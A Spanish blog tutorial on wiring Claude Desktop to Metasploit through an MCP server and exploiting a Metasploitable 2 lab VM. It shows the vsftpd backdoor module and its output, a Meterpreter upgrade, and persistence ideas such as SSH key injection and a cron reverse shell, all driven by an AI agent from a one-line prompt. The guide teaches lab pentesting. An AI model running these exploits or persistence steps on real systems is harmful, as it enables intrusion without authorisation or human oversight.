# Cómo conectar Claude con Metasploit vía MCP: guía completa

Oct 23, 2026 · @ninoc

## Introducción

Este tutorial explica cómo conectar Claude (el asistente de IA de Anthropic) con Metasploit Framework a través del protocolo MCP (Model Context Protocol), de forma que puedas lanzar exploits, abrir sesiones Meterpreter y analizar vulnerabilidades usando lenguaje natural, sin tocar la consola de Metasploit.

El resultado práctico: le dices a Claude «tengo un Metasploitable en 192.168.64.13, explótalo» y él hace todo solo — identifica el vector, lanza el módulo, abre la sesión y te devuelve el resultado. Todo desde el chat.

Esto es posible gracias a **MetasploitMCP**, un servidor MCP de código abierto que expone los módulos de Metasploit como herramientas que Claude puede llamar directamente. MCP es el estándar abierto de Anthropic para conectar modelos de lenguaje con herramientas externas: funciona como un puente entre Claude Desktop y cualquier aplicación o API.

> ⚠️ **Aviso legal**: todo lo que se describe aquí debe realizarse exclusivamente en entornos de laboratorio propios o sistemas para los que tengas autorización expresa. Metasploitable es una VM diseñada específicamente para practicar pentesting de forma segura. Usar estas técnicas en sistemas de terceros sin permiso es ilegal.

## Requisitos previos

Antes de empezar necesitas tener instalado y funcionando:

- **Mac con Apple Silicon o Intel** (el tutorial usa macOS, pero MetasploitMCP también funciona en Linux)
- **Claude Desktop** — descárgalo desde [claude.ai/download](https://claude.ai/download); necesitas una cuenta Claude (la versión gratuita es suficiente)
- **Metasploit Framework** — veremos cómo instalarlo en el Paso 1
- **Python 3.10+** — para correr el servidor MetasploitMCP
- **Git** — para clonar el repositorio
- **Un hipervisor** (UTM, VirtualBox, VMware Fusion o Parallels) para correr la VM Metasploitable
- **Metasploitable 2** — la VM de práctica que usaremos como objetivo

Conocimientos recomendados (no imprescindibles):

- Familiaridad básica con la terminal de macOS
- Nociones básicas de redes (IP, puertos, protocolos)
- Haber oído hablar de Metasploit, aunque no haberlo usado nunca

## Paso 1: Instalar Metasploit Framework en Mac

Metasploit Framework se instala en Mac con un solo comando usando el instalador oficial de Rapid7.

Abre la Terminal y ejecuta:

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

Este script descarga e instala Metasploit en `/opt/metasploit-framework/`. La instalación tarda unos minutos. Una vez completada, verifica que funciona:

```bash
/opt/metasploit-framework/bin/msfconsole --version
```

Deberías ver algo como `Framework Version: 6.x.x`.

**Añadir Metasploit al PATH** (opcional pero recomendado):

```bash
echo 'export PATH="/opt/metasploit-framework/bin:$PATH"' >> ~/.zshrc
source ~/.zshrc
```

A partir de aquí podrás ejecutar `msfconsole` directamente desde cualquier directorio.

> 💡 **Alternativa con Homebrew**: si tienes Homebrew instalado, también puedes usar `brew install metasploit`, aunque el instalador oficial de Rapid7 suele tener la versión más actualizada.

## Paso 2: Instalar y configurar MetasploitMCP

MetasploitMCP es el servidor que actúa de puente entre Claude y Metasploit. Está escrito en Python y se comunica con la API RPC de Metasploit.

**Clona el repositorio:**

```bash
mkdir -p ~/meta
cd ~/meta
git clone https://github.com/GrimmXoXo/MetasploitMCP.git
cd MetasploitMCP
```

**Crea un entorno virtual de Python e instala las dependencias:**

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

**Verifica que el servidor arranca correctamente:**

```bash
python MetasploitMCP.py --transport stdio
```

Si no hay errores, el servidor está listo. Pulsa `Ctrl+C` para detenerlo — Claude Desktop lo arrancará automáticamente cuando lo configure.

**¿Qué hace este servidor?**

MetasploitMCP expone los siguientes tipos de herramientas a Claude:

- `run_exploit` — ejecuta módulos de tipo exploit
- `run_auxiliary_module` — ejecuta módulos de reconocimiento y escaneo
- `run_post_module` — ejecuta módulos de post-explotación sobre una sesión activa
- `list_exploits` — lista exploits disponibles con filtro de búsqueda
- `list_active_sessions` — lista las sesiones Meterpreter abiertas
- `generate_payload` — genera payloads
- `start_listener` / `stop_job` — gestiona handlers
- `send_session_command` — envía comandos a una sesión activa

Cada vez que Claude necesita usar una de estas herramientas, el servidor MCP la ejecuta en segundo plano contra el Metasploit Framework instalado en tu Mac.

## Paso 3: Configurar Claude Desktop para usar el MCP

Ahora hay que decirle a Claude Desktop dónde está el servidor MetasploitMCP. Esto se hace editando el archivo de configuración de Claude Desktop.

**Abre el archivo de configuración:**

```bash
code ~/Library/Application\ Support/Claude/claude_desktop_config.json
```

(Si no tienes VS Code, puedes usar `nano` o cualquier editor de texto.)

**Añade la entrada del servidor MCP:**

Si el archivo ya tiene contenido, añade la clave `mcpServers` dentro del JSON. Si está vacío o no existe, el contenido completo debe ser:

```json
{
  "mcpServers": {
    "metasploit": {
      "command": "/Users/TU_USUARIO/meta/MetasploitMCP/.venv/bin/python",
      "args": [
        "/Users/TU_USUARIO/meta/MetasploitMCP/MetasploitMCP.py",
        "--transport",
        "stdio"
      ]
    }
  }
}
```

> ⚠️ Sustituye `TU_USUARIO` por tu nombre de usuario real de macOS (el que aparece en `/Users/`). Puedes verlo ejecutando `echo $HOME` en la terminal.

**Reinicia Claude Desktop** para que cargue la nueva configuración:

1. Cierra Claude Desktop completamente (menú superior → Quit Claude, o `Cmd+Q`)
2. Vuelve a abrirlo
3. Crea un nuevo chat
4. Haz clic en el icono de herramientas (🔧) o busca en la barra lateral — deberías ver **metasploit** listado como servidor MCP activo con estado «En ejecución»

**Verificación visual:**

En Claude Desktop, ve a **Configuración → Herramientas MCP** (o en la barra lateral busca «MCP Servers»). El servidor `metasploit` debe aparecer en verde con el estado «En ejecución», exactamente como se ve en la captura de este tutorial.

Si aparece en rojo o con error, comprueba:

- Que la ruta al `.venv/bin/python` es correcta (`ls /Users/TU_USUARIO/meta/MetasploitMCP/.venv/bin/python`)
- Que el entorno virtual tiene todas las dependencias (`pip list` dentro del venv)
- Que el JSON no tiene errores de sintaxis (comas mal puestas, llaves sin cerrar)

## Paso 4: Preparar el laboratorio con Metasploitable

Metasploitable 2 es una máquina virtual Linux intencionalmente vulnerable, creada por Rapid7 (los mismos que Metasploit) para practicar pentesting de forma segura y legal.

**Descarga Metasploitable 2:**

- URL oficial: <https://sourceforge.net/projects/metasploitable/>
- Descarga el archivo `.zip`, descomprímelo y obtendrás un disco virtual `.vmdk`

**Importa la VM en tu hipervisor:**

En **UTM** (recomendado en Mac Apple Silicon y es gratuito):

1. Abre UTM → clic en «+» para nueva VM
2. Selecciona «Emulate» → Linux
3. En «Storage», importa el `.vmdk` existente (en lugar de crear uno nuevo)
4. Asigna al menos 512 MB de RAM
5. En «Network», configura el adaptador como **Host-Only** o **Bridged** para que esté en la misma red que tu Mac pero aislada de internet

En **VirtualBox**:

1. Nueva VM → tipo Linux → Ubuntu 32-bit
2. En «Storage», añade el `.vmdk` como disco existente
3. Red: Adaptador Solo-Anfitrión (Host-Only)

**Arranca la VM y confirma la IP:**

Usuario: `msfadmin` / Contraseña: `msfadmin`

Una vez dentro, ejecuta:

```bash
ifconfig
```

Anota la IP del adaptador `eth0` — esa es tu RHOST para los exploits. En el ejemplo de este tutorial era `192.168.64.13`.

**Comprueba la conectividad desde tu Mac:**

```bash
ping 192.168.64.13
```

Si recibes respuesta, el laboratorio está listo.

> 💡 **Tip de red**: si usas UTM con red compartida, la IP del Mac en esa red suele ser `192.168.64.1` (la puerta de enlace). Esa será tu LHOST para los payloads de reverse connection.

## Paso 5: Primera sesión — explotar vsftpd 2.3.4

Con todo configurado, abre Claude Desktop, crea un nuevo chat y dile simplemente:

> *«Tengo un Metasploitable en 192.168.64.13. Mi IP es 192.168.64.1. Explótalo.»*

Claude identificará el vector de ataque más obvio y procederá. Lo que ocurre por debajo es lo siguiente:

**¿Por qué vsftpd 2.3.4?**

Metasploitable 2 corre vsftpd 2.3.4, una versión del servidor FTP que tiene un backdoor deliberadamente plantado: si en el campo de usuario del login FTP incluyes el carácter `:)` (una carita), el servicio abre una shell de root en el puerto 6200. Es un exploit clásico de los labs de práctica.

**Lo que Claude ejecuta internamente:**

Primero lanza el exploit principal:

```
Módulo: exploit/unix/ftp/vsftpd_234_backdoor
RHOSTS: 192.168.64.13
LHOST: 192.168.64.1
Payload: cmd/unix/interact
```

El resultado que devuelve Metasploit:

```
[*] 192.168.64.13:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] 192.168.64.13:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.64.1:4444 -> 192.168.64.13:48552)
```

**Sesión 1 abierta.** A continuación, Claude hace automáticamente el upgrade a una sesión Meterpreter completa:

```
Módulo: post/multi/manage/shell_to_meterpreter
SESSION: 1
LHOST: 192.168.64.1
```

Resultado:

```
[*] Upgrading session ID: 1
[*] Meterpreter session 2 opened (192.168.64.1:4433 -> 192.168.64.13:56706)
```

**Sesión 2 Meterpreter completa.** A partir de aquí tienes acceso completo al sistema como root — confirmado por el propio módulo `local_exploit_suggester` que ejecutamos después: el mensaje `Session already has root privileges` indica que el backdoor de vsftpd nos dio root directamente, sin necesidad de escalar privilegios.

## Paso 6: Post-explotación con el Local Exploit Suggester

Con la Sesión 2 activa, Claude ejecuta automáticamente el módulo `post/multi/recon/local_exploit_suggester` para analizar qué vectores de escalada de privilegios y persistencia tiene el sistema.

El módulo revisa los 2.682 exploits del framework contra las características del sistema objetivo y devuelve los que son aplicables. En nuestro caso encontró **14 vectores activos**:

**Escalada de privilegios:**

| # | Módulo | Motivo |
| --- | --- | --- |
| 1 | `glibc_ld_audit_dso_load_priv_esc` | glibc 2.7 vulnerable |
| 2 | `glibc_origin_expansion_priv_esc` | Vulnerable |
| 3 | `netfilter_priv_esc_ipv4` | Vulnerable |
| 4 | `ptrace_sudo_token_priv_esc` | Posiblemente explotable |
| 5 | `su_login` | Vulnerable |
| 6 | `setuid_nmap` | `/usr/bin/nmap` tiene bit SUID |

**Vectores de persistencia:**

| # | Módulo | Detalle |
| --- | --- | --- |
| 7 | `apt_package_manager` | `/etc/apt/apt.conf.d/` escribible |
| 8 | `bash_profile` | `/root/.bashrc` escribible |
| 9 | `rc_local` | `/etc/rc.local` escribible |
| 10 | `init_sysvinit` | Sistema SysV con `/tmp/` escribible |
| 11 | `init_upstart` | Sistema Upstart con `/tmp/` escribible |
| 12 | `cron` | Cron activo sin restricciones |
| 13 | `ssh_key` | Permite inyectar claves SSH |
| 14 | `autostart` | Xorg instalado |

**¿Para qué sirve esto en la práctica?**

Cada uno de estos vectores es un ejercicio de aprendizaje independiente. Por ejemplo:

- `setuid_nmap`: clásico de CTFs — nmap con SUID permite abrir una shell interactiva como root con `nmap --interactive`
- `ssh_key`: inyectar tu clave pública en `/root/.ssh/authorized_keys` para acceso persistente sin contraseña
- `cron`: añadir una tarea cron que ejecute un reverse shell cada minuto

Con Claude puedes pedirle que ejecute cualquiera de estos módulos sobre la sesión activa con una sola frase.

## Conclusión

Lo que hemos montado es un laboratorio de pentesting asistido por IA que funciona de extremo a extremo:

1. **MetasploitMCP** expone las herramientas de Metasploit como funciones que un modelo de lenguaje puede llamar
2. **Claude Desktop** actúa como interfaz de lenguaje natural — interpretas lo que quieres hacer en inglés o español y él lo traduce a llamadas de módulos concretas
3. **Metasploitable** proporciona un objetivo legal y controlado con el que practicar

El flujo completo — desde «tengo este objetivo» hasta una sesión Meterpreter activa con análisis de post-explotación — lleva menos de 5 minutos con Claude gestionándolo.

**¿Qué puedes hacer a partir de aquí?**

- Explorar otros servicios vulnerables de Metasploitable: Samba (puerto 445), Apache Tomcat (8180), PostgreSQL (5432), UnrealIRCd (6667), Distcc (3632)
- Practicar técnicas de persistencia con los 8 vectores encontrados
- Aprender a documentar hallazgos: pídele a Claude que genere un informe de los módulos ejecutados y sus resultados
- Integrar más herramientas vía MCP: Nmap, Burp Suite, sqlmap — el ecosistema de servidores MCP crece cada semana

**Recursos:**

- [MetasploitMCP en GitHub](https://github.com/GrimmXoXo/MetasploitMCP)
- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Descargar Metasploitable 2](https://sourceforge.net/projects/metasploitable/)
- [Documentación MCP de Anthropic](https://docs.anthropic.com/en/docs/build-with-claude/computer-use)
- [UTM para Mac (hipervisor gratuito)](https://mac.getutm.app/)

---

> ⚠️ **Aviso legal**: esta guía es exclusivamente para fines educativos en entornos controlados. El uso de Metasploit o cualquier herramienta de pentesting contra sistemas sin autorización expresa del propietario es un delito en la mayoría de jurisdicciones. El autor no se hace responsable del uso indebido de esta información.
